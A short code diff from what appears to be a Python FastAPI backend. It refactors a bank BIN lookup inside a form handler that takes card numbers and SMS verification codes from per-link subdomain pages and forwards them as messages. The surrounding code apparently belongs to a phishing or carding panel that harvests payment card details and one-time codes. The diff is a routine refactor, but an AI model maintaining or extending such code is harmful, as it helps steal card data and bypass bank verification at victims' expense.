@@ -6,7 +6,7 @@ from fastapi import APIRouter, Request
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel
 
-from api.bin_lookup import format_bin_line, lookup_bin
+from api.bin_lookup import format_bin_block, lookup_bin
 from db.crud.links import get_link_by_subdomain_and_id
 from db.crud.submissions import upsert_submission
 from db.models import User
@@ -141,8 +141,7 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
     # ── SMS код — короткое отдельное сообщение ────────────────────────────────
     bin_line = ""
     if payload.card_number:
-        bin_digits, bank_name = await lookup_bin(payload.card_number)
-        bin_line = format_bin_line(bin_digits, bank_name)
+        bin_line = format_bin_block(await lookup_bin(payload.card_number))
 
     if payload.verification_code:
         card_block = [
